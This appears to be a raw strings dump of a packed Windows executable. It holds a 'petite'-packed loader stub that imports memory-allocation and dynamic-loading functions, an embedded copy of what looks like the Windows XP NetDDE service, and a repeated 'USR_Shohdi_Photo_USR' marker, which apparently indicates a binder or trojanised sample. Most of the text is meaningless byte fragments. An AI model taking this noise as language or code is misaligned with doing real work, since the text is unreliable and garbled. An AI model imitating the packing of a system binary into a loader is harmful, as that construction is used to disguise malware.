!This program cannot be run in DOS mode.
RichiZ
`.rsrc
petite
06gB
pYPkli
df?s
Q'n'
?W@y
eKqA
&BY*
j]&O
Y+	>H
|8iQ
s"&x
?3E7
www^
G|SZ,
S~Q5t
cACC[
I4Jy&
hlE@p
2O*^
GEC:
rz,}@
RKEEE
l	n+#X
_'^]
>}9/
'b.*
6E+inii
IhJd=
!}D`
;+td#
i+B&
jys+
)c,`
,.DEQ
{1+y
hh2hVGi
PopB
o.5n
6=':Z
b@I	
J]	q
&Hplqy
X\2H<
9j4'
',Sis
+y,)5
6			
=5O-
^clS4
hi5g
F,(q
#l:U<5bxQML
I`?v
q<FIw
*OHA
![uIJ
;o_e
8" l
ib~cF
iR~:
,*/9:7
+D@XDB
`aILY^QXM
-jej
K05	)
}nhN
ef{ONsF
 oTxN@IX
y`l|Z
Y\zSnr`
)3(>'
1qZX
wBnaoj|
+"SCY]
oWszt[fv
q-=#
FMT]
VIqzrkh
HIL}
@i}M
?)=zZ
9h{,@
&Z'uv\
V./z
=tC\$
t$G7
u*+$
H4r$
35`y}$v}{
U]\B^c
69j),
AY'N
XXXX]
!This program cannot be run in DOS mode.
*6Oz	vO
*6Oz	/O
*6OZ	*O
*6Oz	
*6ORich
.text
.data
.rsrc
msvcrt.dll
KERNEL32.dll
NB10
nddeapir.pdb
8MZu
>"u:F
XPVSS
Y_^[
_c_exit
_exit
_XcptFilter
_cexit
exit
_acmdln
__getmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
msvcrt.dll
_controlfp
_except_handler3
GetModuleHandleA
GetStartupInfoA
KERNEL32.dll
p+v^0x
1`5e
l,leT
p^V0
do_b
p\:}
+[lq
oFolsM
_+(p
pC^X
pffD
_bA2
`")p
SYfn
s`_-
BbBb
$EA;E
D+S"@
Bg2 
Id~I`}i
QXNcYgS|x
Mqq(
EUHi
[4@X@
QInC
km5:
1AR?
qs@M
<>@|
;Ym.D!
yGO>m
wml#"
p)ha
V}K;
V}K;
V}K;
V}K;
V}K;
)l{!
y/75-
V}K;
AA/6ax
W+La
m$bZ
yu>m
A2m&;
A:o"mW(
5`Yq
x#fyA
O#,t`
<.@|
qC(`
 \V^
cf`]
0fOd
S"lN
)`P%
g/z?Uc&;
e`]ga%
?'-wN
2eHs[f
QUSlM
9w'Q
A\+O
r/im
1UkR!
!#)&
 ev`
?A$H
cWNn
7'g5
F?CQ
NcYgS|
.j;_~
iJcw
j7=m
@~42l~
 oWJ
bzV-
s;*	
=]4a
u4']
}nn0.
>k0*
H#;b
{b2_
/l?<
	?)%
@5(q
OZ+M4~>|
}gTHA
_YnJy
joC;.
 hTF
W_Q 
?)/@
?HH1
VQ{b\
{s=A
C#f?
;Tq^
~m9p
fYl,
S>N|J
}D)w>r
.oCW
}0@P
Weh;
>zqF
V!ls_
XzV@y
.Z(6
D|c0
oz#&
1x/A
]MS{
;67v
}g#8z
YtCJ
R!zV
l8 +8
5>*r[
eEYg
!ZOB
4pz.
:#V#,
<jG#
ex[)
2x/*(
$c)j
;Gt%
F=!}
1te#
Myt19ej
B\	2
SgGBW
!.qp
x#h!S
tm.W
)f?O.
33C'
t4Md@|{
V1@$
I3F_
0)iJ^5_
X\W_
tAwx
.^h&
o*/@
5J-+pe
-7_0
kL%y
.(lg
7Gt%
C(?^5Hw
Fz&&
]![%
)	v>
N)b7
>@w1|
D4b`
H<aj|
F*XCT
3xj7
F"5[y
)\\\
H2/g#c
$D5y
Ft%e
a=h=
"mU G
1x/q
(CVN
tRzi
m.Zw%
kR!	
V}L;
V}K;
kR!	
V}L;
V}K?
V}K;
kR!	
V}L;
V}K;
_>U(
*r?G
u	!	
g+',
'	^j
,0dp
aG03
:s[^P
lQ0zF0
;Two
N3{P
]$K"
yW>L
sd+T
`l&&
:F6N56hp
8l9+
n<,h
tF#v@
j@6:K
yN;g2
'G>U
USR_Shohdi_Photo_USR
	kI3
Df{2<
's.z
LNJW
!MO+
\}SP
5-NL$
7smm
~]rh%
$bUC
Q<'Q
6&+"
b$,C
@USYiLZ]
i[|R[Q
[,eA
u/	m^
J$T 
s*Qs,G
P.ved
j(fg
U%u0
H%#oD
87o$
jx _
-=#n
A}7+
+_)U
97om
bcY!
ow%u
97om
bcY!
ow%u
97om
bcY!
ow%u
97om
bcY!
ow%u
97om
bcY!
ow%u
7Z%%k
bo8e
97om
bcY!
ow%u
MGF}
l3Hg
3M%X
'P^~SJJ
3j*U
B-w4
I3eD&
H<#9
Zfkk
C'c]
+5dL(
h	8+
O12{
czF?
2'@y
< tjg
1UGK
%3A{-
c:Vq
x a>
:Zo<2G7
|N?#-
5)Ph
U~|I
+!1T
@%WYi
j,;f
ecY!
2j(f7
m44C
MdB7]a
t]?n
E-64
 kjz
 vj0
<Z-c
?or#
ZO? 
	Hkcf,
~4<F,
0DdI<
a44T'
=gS;
0C+t.
)O\2
97~$;
5[{'
ZG16:}
s)hF
eKuqH<
E!kV
zA~{
MUt5
AAwK$
Lkc,
A(<q
6\cr
r~P8N
3l`1
ow%u
crS;
yg^}SsHFo
bP+C
<x8@
MU[M
/"8-
=lx[
eWwIu
upwBx4
I^de
Yi?Z
M:b'
bcYtW**I
-u`&
WDOU
q?'Lx
HW^	9o|q
w +j
)r^y
7jkPEpV
E4e}
kM4F;
v/:b-
F8pb
~.g7r^
n6?)/
#k86
5l-:
6o4q
u	s%
57C,Qm
o}:q
UNPe
2Zrz
G'8&
U?iQ
f %._<
i.2'
:mAK
>zvA:
UXDlYii 
=1\o
1wh''
#?y%
|!;]
6:9o
xXh_4
9!nl)e
syIb:k
#Ei#
09c	9r
P't@#
gsg-
@IGi
Sw-#
BM`i
Yque
\cyv8X|j
WL"t
QK;%x)
O"8y
L-nlbsK;
)oC*
]:7o
gsch
-uX)
%aWEU
+NZm-
MkcNf
|vG{
q!m?
v9.,[
~Y:7o
v/-j
dnIp
V57#
03$[
5.nl
eSk$
;9om
)@T.
$?y&
<L,=
rJ%]
XS%C
nvX>
,Lu_
v[$V
:*Bc
?ox 
owP>
oxMG>
EW)/
3},J4
e{ZV/8
G'u^k
beY!
ow%u
'?^}S
97pm
bdY!
ox%u
'?]}S
97pm
bdY!
'?]}S
97om
ow%w
97om
bcZ!
ow%u
97on
bcZ!
ow&u
97on
bcZ!
ow&u
97on
bcZ!
ow%u
q?'i&
j nR-
Kxz[G1
mmcc
,,"L
'sMMeJ9
Anzp
Z\@$
{_|1k
,'PZ
@)D;.
?TKW
)(r-[
?"	_E
6'd]
97om
bcY!
ow%u
ss]'
5hcil
hky2
M+q 
MessageBoxA
wsprintfA
ExitProcess
GetModuleHandleA
GetProcAddress
VirtualProtect
VirtualAlloc
VirtualFree
LoadLibraryA
??1ios@@UAE@XZ
exit
user32.dll
kernel32.dll
MSVCIRT.dll
MSVCRT.dll
!This program cannot be run in DOS mode.
Rich
.text
.data
.rsrc
msvcrt.dll
ADVAPI32.dll
KERNEL32.dll
NTDLL.DLL
GDI32.dll
USER32.dll
NDdeApi.dll
RPCRT4.dll
Secur32.dll
CF_DIB
CF_PALETTE
d:\xpclient\windows\netdde\src\netdde\ddeintf.c
0x%0X
%s %s
server
%s\protocol\StdFileEditing
%s|*
%s|%s
.ole
.dde
WM_DDE_ACK
WM_DDE_DATA
REQUEST
lpShareInfo released
NetDDE Object
WM_DDE_ACK_EXECUTE
WM_DDE_ADVISE
ADVISE
WM_DDE_POKE
POKE
DATA
UNADVISE
WM_DDE_EXECUTE
  hWnd: %0X, wParam: %0X, hWnd->localWnd: %0X
  SL: %d, RL: %d, SN: %d, RN: %d
d:\xpclient\windows\netdde\src\netdde\ddeq.c
msg       %x
fRelease  %d
fAckReq   %d
fResponse %d
fNoData   %d
hData     %x
NetDDE
NetDDEdsdm
SecKeyAgeLimit
DefaultConnectionDisconnectTime
DefaultConnectionDisconnect
DefaultRouteDisconnectTime
DefaultRoute
DefaultRouteDisconnect
LogRetries
LogExecFailures
LogPermissionViolations
NDDELogErrors
NDDELogWarnings
NDDELogInfo
SecurityType
DefaultExecutePermitted
DefaultPokePermitted
DefaultRequestPermitted
DefaultAdvisePermitted
StartApp
InitAllow
InTouch Blocked DDE V2
Printer_Picture
DoTerminate
HandleIpcXmit
HandleIpcInit
NetddePasswordDlgDone
NetddeSessionClose
NetddeGetClientInfo
NetddeGetOurNodeName
NetddeAlive
NetddeInitiateAck
NDDETimeSlice
NDDEShutdown
NDDEGetConnectionConfig
NDDESetConnectionConfig
NDDEXmtPacket
NDDERcvPacket
NDDEGetConnectionStatus
NDDEDeleteConnection
NDDEAddConnection
NDDEGetNewConnection
NDDEGetCAPS
NDDEInit
NetDDEMainWdw
NDDENB32
DDE Share
Out of Memory (%ld bytes needed)
INTERNAL ERROR: %s %s
ASSERTION: %s %s Line %d
%s\%s
Software\Microsoft\NetDDE\Parameters
NetDDEParameter
d:\xpclient\windows\netdde\src\ntddecmn\dder.c
12345678
Bad DD type, %8lX lpDder->dd_type: %d
DDE_ADVISE
DDE_REQUEST
DDE_POKE
Expecting from %08lX to be %08lX or %08lX
DderInitConversation: Unknown type: %d
d:\xpclient\windows\netdde\src\ntddecmn\userdde.c
DDE_INITIATE
DDE_INITIATE_ACK
DDE_EXECUTE_ACK
DDE_ACK
DDE_EXECUTE
palette
oemtext
tiff
sylk
metafilepict
bitmap
text
DDE_UNADVISE
DDE_DATA
MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
d:\xpclient\windows\netdde\src\ntddecmn\pktz.c
Unexpected pktz timer id: %08lX
PktzXmitErrorOnPkt( %08lX, %08lX, %d ) unkn status
Connection
PKTZ %08lX in unknown state: %ld
d:\xpclient\windows\netdde\src\ntddecmn\timer.c
d:\xpclient\windows\netdde\src\ntddecmn\router.c
Unexpected router timer id: %08lX
Route
Router got unknown cmd %08lX from net
ConnectionNames
Routes
SOFTWARE\Microsoft\NetDDE\DDE Shares
InitAllowed
CmdShow
SerialNumber
ShareDBInstance
DDE Shares database does not exist.
NDdeApi
Dummy
ncacn_np
\pipe\nddeapi
 2_/&
NB10
netdde.pdb
YYPjJ
YYPjJ
YYPj0
u&Vj3
YYPjK
YYPj4
YYPj5
u!Pj
YYPj5
YYPjL
YYPjL
YYPj0
YYPj5
YYPjM
YYPjQ
YYPj0
QQSVWj
YYPh 
YYPjP
YYPh 
YYPjP
VVVP
YYPjN
YYPjN
YYPh(
YYPjP
YYPh(
YYPjP
YYPjO
IItrIt
tWItA
t)f;=$
t^VW
u(h0
@_^][
YYPj
uvVP
Hx\S
t?Ht,
YYPVj
ExSVW
EDt{
YYuL
EHPj
MPQ3
MHQPP
MPQ3
MHQPP
uHPj
}T9_
ulVW
9]Du 9]<t
9]@t
upVhp
FRS@f
t$ @f
t$$@f
^][Y
H2VW
9B<VWt7
H2VW
H2VW
IIVt;It
^][_
SPhh
Ht&j
YYPj(
t*SPhh
IItqIt
tVIt@
t(f;
^8t	SW
^8t	SW
_^][
n8u>9^,u9
St	V
^]_h
It,I
D$ P
t$ j
L$ Q
t$ j
9^<u
YYPj!
SPhh
YYPj"
SSSSh
uA9_
tT9]
t'9]
~2Vf
t2;E
YYPj)
tMPj
N$QP
@u-Wj
YYPj+
F&P3
F$PV
F&P3
F$PV
F&P3
F$PV
tjHt^
tPf;
F&P3
F$PV
toHtc
tUf;
F&P3
F$PV
CRhP
8F$t
~'W	E
Ht^H
QPhh
YYPhP
QPhh
YYPhH
QPhh
YYPhX
QPhh
YYPh
QPhh
YYPh4
YYPj/
YYPj'
HtUHtDHt,j
YYPj
F2HHt
F2HHtHHHt7
F2HHt
9^,t
	t(H
YYPj
F0f;
YY9]
F,u	V
F2HHt
HHuf
9~,t
F2HHt
HHub
YYPh
F2HHt
HHu7
PPPPh
F\Pf
t1VW
YYPj8
@_^][
YYPj9
tLVW
YYPjF
VVhB
YYPjC
YYPjD
YtFHj
YWWWQ
YtFHj
YWWWQ
SVWhq
VVVj
VWh"
t[WWj
t^Vj
t(WWWj
YYPjE
WSh|
WShd
WSh(
YYPj
YYPj
WVhh
YYPj
YYPj
u,9}
u$9}
uF9}
up9=
9f9}
PShB
t.WWPSSW
YYPj
u|Wj	S
F t<h
F$t(h
F,u$
F4Pj
$SVW
SSPPPPh
@Ph`p
QUVj j@
[ugUUUU
PUVh
_^]Y
(Pj@
E`Ph
VVVj
9]pt
E@Pj
ElPj
ElPW
t*j j@
SVW3
jtmIt)I
Wjnh
Wjlh
WjmS
jtoIt+I
Sj!h
t	SjnW
t	SjlW
FSVj
^[_]
SUVW
D$ ;F
t:9l$0t
t$$P
_^][
HHVtGHt j
YYPj:
UVWP
f;F0
[t$;
YYPj;
_^]Y
t)VW
QSVW
@_^[
VtNIt9IIt#j
YYPj<
YYPj=
PWWj
YYPj>
YYPj?
YYPj@
E4SVW
PSSj
YYPj@
8MZu
>"u:F
XPVSS
Y_^[
VWhP
t$ V
t$ V
t$,W
t$ V
t$ V
t$,W
PSh?
UVWj`j
@j@j
FPtJj$j
FTu 
_^][Y
^\^[
_^][
_^][
p,O8
u)9^
F$VWf
^L9]
t[Wf
9N<W
tTHt(H
t[PSh<
t6PSh0
PSh$
V@t>
QPShH
F(WVS
u'!E
w$PW
t$f9^
(PVh
YYPh
C@Pf
K<t*
(PVh
YYPh
Sj(j
YYPh
YYPh
YYPh
_^][Y
1f;5,
(PSh
YYPh0
Eh_^[
YYPh`
Eh_^[
9uXf
(PWh
YYPhp
ET_^[
(PSh
YYPh$
E`_^[
9u`f
(PWh
YYPh<
E\_^[
@_^[
_^[]
_^][
;~$t
QSUVW3
~NWf
FNPE
D$ f
_^][Y
HSVW
Ht[Ht'Ht
F0Pjj
GpPS
G0Pjn
f;Gpv#
G0Pjo
F0Pjm
F0Pjl
F0Pjk
_^[]
G(f=
D86P
FxPh
G,f;FTs
G*f;FRs
NRSQ3
f;G4s?h
D86Ph
D86Ph
W2uKf=
u@f;NTs
*f;~Rs
N0Q3
NRQ3
F0Pjp
F0Pjq
G0PS
F0Pjt
F0PPjr
QSVW
ItRIt
PRWh
f;Gp
G0Pju
YYPSjx
f;Gtv$
YYPSjy
PSjz
SRhh
G0Pjv
f;Grv(
G0Pjw
FdPRQ
FT9E
tcj(j
tD9]
9~xt:9
F|Wi
B8@9C
u	9}
EDDN
txSV
N8;H
QQSV
F ;C$tr
C0Pji
thPVh<
_][^
Vj j
Yt\SV
!srt
_^[]
u	SV
St	W
9] t
j)X9] 
_^[]
Wj+V
YVt0
@_^]
FDf9_ 
G"PS
f9|$
f9|$
u"9N
_^[]
_^[]
G.QSWPP
F(QP
QQVW
9~HtAf
FLWi
FdPf
v\SWVP
FHPh
Ht9Ht+Ht
GHPh
tYPV
@_^[
"A@@
Yr&=
f9\F
9](t
E(t*V
YYPh
X_^[
YYPh
ti9]
YYPWV
@_^[
E S3
YYPh
PSSh
tZ9]
YYPh
QSSh
X_^[
SVW3
X_^[
YYPh
PWWh
uuWWWW
>FYF
YYPh
Vh@ 
YYPh
PSh( 
PSh0 
X_^[
X_^[
YYPh
Sh@ 
SSSS
E$S3
YYPh
PSSh
PSh`
X_^[
SSSSj
SSSSj
SSSSj
SSSSj
9|$(
|$$;
G0Pj
D$@h
D$(SS
_^][
E V3
u9VVW
1_[^
PSSh
YYPh
Sh0 
@_^[
YYPh
ElPSSSSSSh 
YYPh
EhPSSSSSSh#
EdPSSSSSSh!
YYPh
E\PSSSSSSSSj
YYPh
EPPSSSSSSSSj
YYPh
YYPh
YYPh
YYPh
YYPh
YYPh
YYPh
YYPh
EptH
M(QP
E<u*S
YYPh
E<_^[
SVW3
X_^[
6Pj@
6PSW
SVW3
X_^[
6Pj@
6PSW
t&SW
t'WV
QQSVW
WSSSSSSh 
SSSSSSSj
SSSSSSSj
@_^[
tAWVh8!
~+hH!
~+hH!
~j,W
YYuoW
~#hH!
YY~B
+j,W
^_[]
C;|$
@_^[
@@Af9
@@Af9
Vh0 
YYPh
YYPh
QSVW
E$PW
SVWU
%33333
33333
]_^[
33333
]_^[
SUVW
UUUU3
UUUU3
_^][
v@SV
QZ^&
_stricmp
_strnicmp
strncpy
_strupr
strchr
tolower
_c_exit
_exit
_XcptFilter
_cexit
exit
_acmdln
__getmainargs
_initterm
__setusermatherr
_adjust_fdiv
__p__commode
__p__fmode
__set_app_type
msvcrt.dll
_except_handler3
_controlfp
RegCloseKey
RegQueryValueA
RegOpenKeyA
ObjectCloseAuditAlarmA
SetServiceStatus
RegisterServiceCtrlHandlerA
StartServiceCtrlDispatcherA
SetSecurityDescriptorDacl
AddAccessAllowedAce
InitializeAcl
InitializeSecurityDescriptor
GetLengthSid
GetSidSubAuthority
InitializeSid
GetSidLengthRequired
OpenProcessToken
OpenThreadToken
LookupAccountSidA
GetTokenInformation
AccessCheckAndAuditAlarmA
IsValidSecurityDescriptor
RevertToSelf
ADVAPI32.dll
GlobalFree
GlobalAlloc
GlobalUnlock
GetLastError
GlobalLock
GlobalSize
GlobalGetAtomNameA
LeaveCriticalSection
EnterCriticalSection
GlobalReAlloc
lstrcmpiA
GlobalAddAtomA
LocalFree
TlsGetValue
lstrcpyA
LocalAlloc
lstrlenA
GlobalHandle
lstrcatA
GlobalDeleteAtom
InterlockedExchange
InterlockedDecrement
OutputDebugStringA
CloseHandle
GetCurrentThreadId
InterlockedIncrement
GetModuleFileNameA
SetEvent
CreateThread
WaitForSingleObject
CreateEventA
GetTickCount
GetProcAddress
FreeLibrary
LoadLibraryA
lstrcpynA
ResumeThread
GetComputerNameA
TlsSetValue
DisconnectNamedPipe
WriteFile
WaitForMultipleObjects
ConnectNamedPipe
ReadFile
CreateNamedPipeW
TlsAlloc
InitializeCriticalSection
SetConsoleCtrlHandler
SetProcessShutdownParameters
GetCurrentProcess
GetCurrentThread
LocalUnlock
LocalLock
GetModuleHandleA
GetStartupInfoA
KERNEL32.dll
GetMetaFileBitsEx
SetMetaFileBitsEx
GetBitmapBits
GetObjectA
CreateBitmapIndirect
GetEnhMetaFileBits
SetEnhMetaFileBits
GetPaletteEntries
CreatePalette
DeleteObject
DeleteMetaFile
DeleteEnhMetaFile
GetStockObject
GDI32.dll
FreeDDElParam
UnpackDDElParam
GetWindowLongA
IsWindow
SendMessageA
wsprintfA
SetWindowLongA
CharUpperA
PostMessageA
ReuseDDElParam
PackDDElParam
DestroyWindow
SendMessageTimeoutA
DdeSetQualityOfService
CreateWindowExA
GetParent
GetWindowThreadProcessId
DefWindowProcA
GetClassLongA
RegisterClassA
LoadCursorA
RegisterClipboardFormatA
RegisterWindowMessageA
UpdateWindow
GetDesktopWindow
PostQuitMessage
GetWindow
SendDlgItemMessageA
CloseWindowStation
CloseDesktop
PeekMessageA
DispatchMessageA
TranslateMessage
GetMessageA
OemToCharA
SetThreadDesktop
FindWindowA
GetThreadDesktop
OpenDesktopW
SetProcessWindowStation
GetProcessWindowStation
OpenWindowStationW
MessageBoxA
LoadStringA
ShowWindow
SetFocus
SetDlgItemTextA
GetDlgItemTextA
SetCursor
EnableWindow
GetDlgItem
IsWindowVisible
IsDialogMessageA
SetForegroundWindow
CreateDialogParamA
ImpersonateDdeClientWindow
USER32.dll
NDdeApi.dll
NtSetInformationThread
vsprintf
_snprintf
_vsnprintf
RtlAnsiStringToUnicodeString
RtlInitUnicodeString
RtlCopyString
memmove
_chkstk
RtlInitAnsiString
RtlOpenCurrentUser
atoi
wcschr
wcslen
wcscat
wcscpy
swprintf
wcscspn
ntdll.dll
RpcImpersonateClient
RpcServerListen
RpcServerRegisterIf
RpcServerUseProtseqEpA
NdrServerCall2
RPCRT4.dll
DdeGetQualityOfService
GetFocus
GetClipboardFormatNameA
wsprintfW
LsaFreeReturnBuffer
LsaLogonUser
LsaCallAuthenticationPackage
LsaLookupAuthenticationPackage
LsaRegisterLogonProcess
Secur32.dll
vswprintf
fclose
fputs
fopen
ctime
time
free
DeregisterEventSource
ReportEventA
RegisterEventSourceA
ReportEventW
RegisterEventSourceW
RegQueryValueExA
RegOpenKeyExA
RegSetValueExW
RegCreateKeyExA
RegSetValueExA
RegQueryValueExW
DestroyPrivateObjectSecurity
GetSecurityDescriptorLength
CreatePrivateObjectSecurity
RegDeleteKeyW
RegCreateKeyExW
RegOpenKeyExW
GetPrivateObjectSecurity
SetPrivateObjectSecurity
RegEnumKeyExW
RegDeleteValueA
MakeSelfRelativeSD
GetAce
SetSecurityDescriptorGroup
SetSecurityDescriptorOwner
FreeSid
AllocateAndInitializeSid
ObjectCloseAuditAlarmW
ObjectDeleteAuditAlarmW
AccessCheckAndAuditAlarmW
GlobalCompact
MultiByteToWideChar
WideCharToMultiByte
IsBadReadPtr
IsBadWritePtr
lstrcmpiW
k5?n
D,k Z
NetDDEIntf
KGS!@#$%`
netdde.ini
General
Interface%d
Interfaces
NetddeAgentAlive
NetddeAgentWakeUp
NetddeAgentExecRtn
NetddeAgentDying
NetDDE
NDDE$
netdde.log
NetDDE
CORE1.0
NDDEAPI
netdde.ini
f0&f
fHjC
!jJ&
!^<Nx
j<mP
mH]a
7A/s
p#e}A
qhlA0
 !M+i
 ?5z
MOqC
%^vE
-fdI
m7#%
u7+5
u7+5
u7+5
u7+5
v5:8
u7+5
fTRJ
O1Qt
yv3,C
Ip?7
GP}d
YSO\
=-sSi'`
Pu5#
iSYed\
}_?;
Al_]
r@U}
Q!2o
1;fv]
id{$oI
0t.w
Vg	9
K1AV
746_;9O"G%<
L3!t
viIi
-toIa 
KI>=c
U?;S
g{eN
'd-j
oQvXE
o3-{b
,7im
P9Cl
'n.u
9|Bq
pAak
"<nS
9&"#
dH=d
u\Rk
ELEc
\"fw
*@uq*
BWdO
 t`j
 3?XHc
S~VI
QSA5
F|8%
G'+u
uso#
AL3!
'~X,N
:7~U
's%j`s
]2gr
Ai]o
jq(G
$=^o
AbB%
4vHt
^u"cf
&	x9O
5`*Kn
	Nj&
'R&i5
9lc7
Ihj{
QMxM
xw[bOl
'+xA)
I6 6
jU(G
zp5p
aIC?_ 
/W<X@
>a?r
!(eCs
h`j\i
#+<O0
aMf<
`9d[
q4a9
*I`	_s
=7Gm
I'+ux
=7#Z
-g{e
^?5>{
owvk
l49^iu
dW[T
Z/D#L
V ~V
QsKy
Sx=i
x0&1
#	Ns\
_}(x
gq&qj
[*H"
mhuW{
}K+L
sz0k-
]n)4
mi!A
SWsM4
RG9+i
Ui#_
Ea|tu
sClx
3!%I
Es)[b
r]em
94o/
}"s0
*-sj
.n[!
@)tUPLFq
D`<`{
.5fA
JP`B
kI*bPB?
n"3?Y
83d\{
/y|>
_3G<
$HQJ
dy\)
KgAg
Y/	s
]c]HX
[N#D
j	#|G
|+OU
J|4D
f`jZf
`9H6
l;~V
=/s-
,i$^
h`DX
Z/4k
bM-w[R
!M'+
F3!c
hS5w
l<GA
r}w[
S6\K
@5c/
`9&}A-
q !n=`S#
E4Yh=
p"d/$
J(cs
]U7I
ZxCn
h"Hp
A.z`
IE0#
\d/D
82KID
-s,5
ZH/d
7zp'
< 8]
plE:rX
!*eC
w=2F=
b3&m
%YaT
u7,5
)c !
u7+5
u7+5
u7,5
)c !
u7,5
u7,5
)c !
u7,5
)c !
u7,5
)c !
; kuakK
G{qj
61o]qK
}N@Y
A/|`z
SFEf
i"_l
b"ko!
1ErO	
R#M3Bf
YpXqCH
]kVIY
_&B'
7\cV
Z<!7
EYjT
56kj
T"DY
x,{K
SAIC?
?Qff
1G1`O
USR_Shohdi_Photo_USR
